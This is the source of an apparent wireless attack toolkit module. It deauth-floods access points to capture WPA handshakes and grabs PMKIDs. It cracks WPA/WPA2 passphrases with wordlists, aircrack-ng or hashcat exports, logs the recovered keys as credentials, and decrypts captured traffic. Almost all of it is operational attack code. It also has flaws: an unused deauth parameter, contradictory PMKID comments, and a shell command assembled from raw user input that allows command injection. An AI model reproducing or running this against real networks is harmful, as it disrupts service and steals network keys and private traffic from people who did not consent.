"""
Analysis module.

  * Capture WPA handshake (deauth-assisted)
  * Crack WPA/WPA2 PSK (pure-Python PMKID + EAPOL MIC; aircrack-ng bridge)
  * Decrypt captured WPA2 traffic with a known passphrase
  * Inspect any pcap (decoded lines + hex + protocol breakdown)
"""
import threading
import time

from open80211.core import ui
from open80211.core.config import CONFIG, check_platform
from open80211.core import crypto, netutils as nu
from open80211.core.interfaces import set_channel, which
from open80211.core.targets import TARGETS, pick_ap, add_cred, log_event

try:
    from scapy.all import sniff, wrpcap, rdpcap, Dot11, RadioTap
except Exception:
    pass


# --------------------------------------------------------------------------
# Handshake capture
# --------------------------------------------------------------------------

def capture_handshake(iface: str, bssid: str, ssid: str, channel: int = 0,
                      timeout: float = 60.0, deauth: bool = True) -> str:
    """Capture a 4-way handshake to a pcap. Returns pcap path or ''."""
    if not check_platform("linux"):
        return ""
    ui.section("Handshake Capture", f"AP={ssid} ({bssid}) ch={channel}")
    bssid = nu.norm_mac(bssid)
    if channel:
        set_channel(iface, channel)
    outfile = CONFIG.save(f"handshake-{bssid.replace(':','')}", {}, "pcap")
    frames = []

    def handler(pkt):
        if pkt.haslayer(Dot11):
            frames.append(pkt)

    stop = threading.Event()

    def deauth_loop():
        from open80211.modules.attacks import deauth_flood
        for _ in range(5):
            if stop.is_set():
                return
            deauth_flood(iface, bssid, count=3, interval=0.3)
            time.sleep(1)

    t_deauth = threading.Thread(target=deauth_loop, daemon=True)
    if deauth:
        t_deauth.start()
    ui.info(f"Waiting for handshake on channel {channel}...")
    try:
        sniff(iface=iface, prn=handler, store=False, timeout=timeout)
    except KeyboardInterrupt:
        pass
    stop.set()
    wrpcap(str(outfile), frames)
    hs = crypto.extract_handshake(str(outfile))
    if hs["anonce"] and hs["snonce"]:
        ui.ok(f"Handshake captured: AP {hs['ap_mac']} <-> STA {hs['sta_mac']}")
        ui.info(f"  saved -> {outfile}")
        return str(outfile)
    ui.warn("No complete handshake captured. Try again with deauth running "
            "while a client reconnects.")
    return str(outfile)


# --------------------------------------------------------------------------
# Cracking
# --------------------------------------------------------------------------

def capture_pmkid(iface: str, bssid: str, ssid: str, channel: int = 0,
                  timeout: float = 45.0, deauth: bool = True) -> str:
    """Capture a PMKID (msg1 contains it) - works even without a connected client."""
    if not check_platform("linux"):
        return ""
    ui.section("PMKID Capture", f"AP={ssid} ({bssid}) ch={channel}")
    bssid = nu.norm_mac(bssid)
    if channel:
        set_channel(iface, channel)
    outfile = CONFIG.save(f"pmkid-{bssid.replace(':', '')}", {}, "pcap")
    frames = []

    def handler(pkt):
        if pkt.haslayer(Dot11):
            frames.append(pkt)

    ui.info("Waiting for RSN handshake... (PMKID needs a client association)")
    try:
        sniff(iface=iface, prn=handler, store=False, timeout=timeout)
    except KeyboardInterrupt:
        pass
    wrpcap(str(outfile), frames)
    hs = crypto.extract_handshake(str(outfile))
    if hs["pmkid"]:
        ui.ok(f"PMKID captured: {hs['pmkid']}")
        ui.info(f"  saved -> {outfile}")
        return str(outfile)
    ui.warn("No PMKID captured. Deauth a connected client to force a new handshake.")
    return str(outfile)


def export_menu(handshake_pcap: str = "", hs: dict = None) -> None:
    """Export a captured handshake for industry cracking tools."""
    if not hs:
        hs = crypto.extract_handshake(handshake_pcap) if handshake_pcap else {}
    if not hs or not hs.get("eapol_msgs"):
        ui.error("No handshake data. Capture one first.")
        return
    ssid = ui.ask("SSID")
    if not ssid:
        return
    ui.section("Hash Exports", f"SSID={ssid}")
    choice = ui.menu("Export", [
        "hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL)",
        "hccapx via wpaclean",
        "cowpatty format (instructions)",
        "All exports",
    ])
    if choice == 0:
        return
    from open80211.core.integrations import export_hc22000, export_hccapx_aircrack, export_cowpatty
    if choice in (1, 4):
        export_hc22000(hs, ssid)
    if choice in (2, 4) and handshake_pcap:
        export_hccapx_aircrack(handshake_pcap, ssid, hs.get("ap_mac", ""))
    if choice in (3, 4):
        export_cowpatty(hs, ssid)
    ui.info("Crack with: hashcat -m 22000 <hashfile> <wordlist>")


def crack_menu(handshake_pcap: str = "") -> None:
    hs = None
    if not handshake_pcap:
        handshake_pcap = ui.ask("Path to handshake pcap (or blank)")
    if not handshake_pcap:
        return
    hs = crypto.extract_handshake(handshake_pcap)
    if not hs["eapol_msgs"]:
        ui.error("No EAPOL messages found in that file.")
        return
    ui.show_table("Handshake Details", ["Field", "Value"], [
        ["AP BSSID", hs["ap_mac"]], ["Client", hs["sta_mac"]],
        ["ANonce", hs["anonce"][:24] + "..."], ["SNonce", hs["snonce"][:24] + "..."],
        ["PMKID", hs["pmkid"] or "n/a"], ["EAPOL msgs", hs["count"]],
    ])
    ssid = ui.ask("Network SSID")
    if not ssid:
        return
    choice = ui.menu("WPA Cracking", [
        "Pure-Python dictionary attack (PMKID + EAPOL MIC)",
        "aircrack-ng (fast, GPU/hashcat ready)",
        "Export hashes for hashcat/online services",
    ])
    if choice == 0:
        return
    if choice == 1:
        wl = ui.ask("Wordlist path", default="/usr/share/wordlists/rockyou.txt")
        import os
        if not os.path.isfile(wl):
            ui.error("Wordlist not found.")
            return
        ui.info("Testing passwords...")
        found = None
        count = 0
        for pw in crypto.load_wordlist(wl):
            count += 1
            if count % 1000 == 0:
                ui.info(f"  tried {count} passwords...")
            found = crypto.crack_psk([pw], ssid, hs)
            if found:
                break
        if found:
            ui.ok(f"PSK FOUND: {found}")
            CONFIG.save("cracked", {"ssid": ssid, "psk": found})
            add_cred({"protocol": "WPA2-PSK", "data": f"{ssid}:{found}",
                      "src": hs.get("ap_mac", "")})
            log_event("crack", f"PSK {ssid} = {found}")
            ui.clipboard(found, "PSK")
        else:
            ui.warn(f"No match after {count} passwords.")
    elif choice == 2:
        if not which("aircrack-ng"):
            ui.error("aircrack-ng not installed.")
            return
        from open80211.core.interfaces import system_command
        cmd = f"aircrack-ng -b {hs['ap_mac']} -w {ui.ask('Wordlist')} {handshake_pcap}"
        rc, out = system_command(cmd, timeout=600)
        ui.info(out[-2000:])
        if "KEY FOUND" in out:
            ui.ok("Cracked!")
    elif choice == 3:
        export_menu(handshake_pcap, hs)


# --------------------------------------------------------------------------
# Traffic decryption
# --------------------------------------------------------------------------

def decrypt_menu() -> None:
    pcap = ui.ask("Capture (pcap) containing handshake + data", default="")
    if not pcap:
        return
    hs = crypto.extract_handshake(pcap)
    if not (hs["anonce"] and hs["snonce"]):
        ui.error("Complete handshake not found in capture.")
        return
    ssid = ui.ask("SSID")
    pw = ui.ask("Passphrase", password=True)
    ui.info("Deriving PTK and decrypting data frames...")
    res = crypto.decrypt_wpa_capture(pcap, pw, ssid)
    if not res["decrypted"]:
        ui.warn("Could not decrypt any frame. Verify SSID/passphrase and that "
                "the capture holds an intact handshake.")
        return
    ui.ok(f"Decrypted {len(res['decrypted'])} frames.")
    for item in res["decrypted"][:20]:
        ui.info(f"  {item['src']} -> {item['dst']}: {item['data']}")
    report = CONFIG.save("decrypted_traffic", res)
    ui.ok(f"Full dump saved -> {report}")


# --------------------------------------------------------------------------
# pcap inspection
# --------------------------------------------------------------------------

def inspect_pcap() -> None:
    pcap = ui.ask("pcap path", default="")
    if not pcap:
        return
    try:
        pkts = rdpcap(pcap)
    except Exception as e:
        ui.error(f"Could not read pcap: {e}")
        return
    ui.info(f"Reading {len(pkts)} packets from {pcap}")
    choice = ui.menu("Inspection", [
        "Decoded summary lines",
        "Protocol breakdown",
        "Hex dump of first 20 packets",
    ])
    if choice == 0:
        return
    if choice == 1:
        for p in pkts:
            print(nu.decode_packet(p))
    elif choice == 2:
        from collections import Counter
        c = Counter()
        for p in pkts:
            line = nu.decode_packet(p)
            key = line.split(" ")[0].strip("[]") if line else "?"
            c[key] += 1
        ui.show_table("Protocol Breakdown", ["Protocol", "Count"],
                      [[k, v] for k, v in c.most_common()])
    elif choice == 3:
        for p in pkts[:20]:
            raw = bytes(p)
            ui.info(f"{len(raw)} bytes:")
            for i in range(0, len(raw), 16):
                chunk = raw[i:i + 16]
                hexs = " ".join(f"{b:02x}" for b in chunk)
                asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                print(f"  {i:04x}  {hexs:<48}  {asc}")


def analysis_menu(iface: str) -> None:
    while True:
        choice = ui.menu("Analysis", [
            "Capture WPA handshake (auto-deauth)",
            "Capture PMKID (works with one client)",
            "Crack WPA/WPA2 PSK",
            "Decrypt captured WiFi traffic (needs passphrase)",
            "Inspect a pcap file",
            "Export hashes (hashcat 22000 / hccapx / cowpatty)",
        ])
        if choice == 0:
            return
        if choice == 1:
            ap = pick_ap("Target AP") if TARGETS.aps else None
            bssid = ap["bssid"] if ap else ui.ask("Target AP BSSID")
            if not bssid:
                continue
            ssid = ap.get("ssid", "") if ap else ui.ask("AP SSID")
            ch = ap.get("channel", 6) if ap else ui.ask_int("Channel", default=6)
            timeout = ui.ask_int("Capture timeout (s)", default=45)
            deauth = ui.confirm("Force deauth to speed up handshake?", default=True)
            p = capture_handshake(iface, bssid, ssid, ch, timeout, deauth)
            log_event("capture", f"handshake {bssid} {ssid}")
        elif choice == 2:
            ap = pick_ap("Target AP") if TARGETS.aps else None
            bssid = ap["bssid"] if ap else ui.ask("Target AP BSSID")
            if not bssid:
                continue
            ssid = ap.get("ssid", "") if ap else ui.ask("AP SSID")
            ch = ap.get("channel", 6) if ap else ui.ask_int("Channel", default=6)
            timeout = ui.ask_int("Capture timeout (s)", default=45)
            deauth = ui.confirm("Deauth a client to force re-association?", default=True)
            capture_pmkid(iface, bssid, ssid, ch, timeout, deauth)
        elif choice == 3:
            crack_menu()
        elif choice == 4:
            decrypt_menu()
        elif choice == 5:
            inspect_pcap()
        elif choice == 6:
            pcap = ui.ask("Handshake pcap path", default="")
            export_menu(pcap)